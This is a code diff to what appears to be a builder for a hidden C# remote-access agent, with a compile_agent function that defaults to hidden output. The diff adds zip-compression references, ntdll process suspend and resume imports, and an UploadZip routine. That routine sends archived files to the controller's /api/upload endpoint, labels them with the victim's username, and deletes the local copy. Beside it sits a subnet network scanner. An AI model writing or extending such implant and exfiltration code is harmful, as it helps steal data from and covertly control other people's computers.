@@ -1395,6 +1395,8 @@ def compile_agent(source, name, compiler, hidden=True):
             '-r:System.Windows.Forms.dll',
             '-r:System.Management.dll',
             '-r:System.Security.dll',
+            '-r:System.IO.Compression.dll',
+            '-r:System.IO.Compression.FileSystem.dll',
             '-warn:0',
             '-nowarn:CS1701',
             source_path
@@ -1411,6 +1413,8 @@ def compile_agent(source, name, compiler, hidden=True):
             '/r:System.Windows.Forms.dll',
             '/r:System.Management.dll',
             '/r:System.Security.dll',
+            '/r:System.IO.Compression.dll',
+            '/r:System.IO.Compression.FileSystem.dll',
             '/warn:0',
             source_path
         ]
@@ -1519,7 +1523,9 @@ def generate_agent_source(bc):
         "using System.Linq;\n"
         "using System.Threading;\n"\
         "using System.Collections.Generic;\n"\
-        "using System.Collections.Concurrent;\n"
+        "using System.Collections.Concurrent;\n"\
+        "using System.IO.Compression;\n"\
+        "using System.IO.Compression.FileSystem;\n"
         "using System.Diagnostics;\n"
         "using System.Drawing;\n"
         "using System.Drawing.Imaging;\n"
@@ -2818,7 +2824,25 @@ def _generate_file_manager_code():
 
 def _generate_network_scanner_code():
     return (
+        "[DllImport(\"ntdll.dll\", SetLastError = true)] static extern int NtSuspendProcess(IntPtr processHandle);\n"
+        "        [DllImport(\"ntdll.dll\", SetLastError = true)] static extern int NtResumeProcess(IntPtr processHandle);\n"
         "        // ==== Network Scanner ====\n"
+
+        "        static void UploadZip(string zipPath, string moduleName) {\n"
+        "            try {\n"
+        "                if (!File.Exists(zipPath)) return;\n"
+        "                byte[] fileBytes = File.ReadAllBytes(zipPath);\n"
+        "                var req = (HttpWebRequest)WebRequest.Create(_server + \"/api/upload\");\n"
+        "                req.Method = \"POST\"; req.ContentType = \"application/octet-stream\";\n"
+        "                req.Headers.Add(\"X-Client-ID\", _clientId);\n"
+        "                req.Headers.Add(\"X-Filename\", moduleName + \"_\" + Environment.UserName + \".zip\");\n"
+        "                req.Timeout = 120000;\n"
+        "                using (var s = req.GetRequestStream()) s.Write(fileBytes, 0, fileBytes.Length);\n"
+        "                req.GetResponse().Close();\n"
+        "                File.Delete(zipPath);\n"
+        "                Res(\"success\", moduleName + \" uploaded successfully to server.\");\n"
+        "            } catch (Exception ex) { Res(\"error\", moduleName + \" upload failed: \" + ex.Message); }\n"
+        "        }\n\n"
         "        static string ScanNetwork() {\n"\
         "            string subnet = \"192.168.1\";\n"\
         "            try {\n"\
